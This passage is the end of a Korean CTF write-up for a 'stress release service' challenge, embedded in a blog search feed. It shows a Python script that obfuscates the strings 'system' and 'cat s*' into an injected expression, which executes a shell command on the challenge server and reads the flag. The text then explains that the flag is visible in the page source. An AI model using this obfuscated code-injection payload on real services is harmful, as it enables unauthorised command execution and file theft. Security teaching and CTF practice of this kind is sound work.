class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s)):</span><br><span class="line">        res += rtos(tbl[s[i]]) + <span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    gen_table()</span><br><span class="line"></span><br><span class="line">    f = encode(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">    a = encode(<span class="string">&quot;cat s*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&#x27;;(<span class="subst">&#123;f&#125;</span>)(<span class="subst">&#123;a&#125;</span>);&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>문자열을 입력하고 버튼을 누르면 개구리 말고 다른 내용은 보이지 않는데, 브라우저의 소스 코드 확인 기능을 이용하면 플래그가 포함되어 있는 것을 확인할 수 있습니다.</p>
<p><img src="/images/tet24-stress-release-service/3.png" alt="3.png"></p>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
]]></content>
      <categories>
        <category>Security</category>
        <category>CTF</category>
      </categories>
  </entry>
</search>
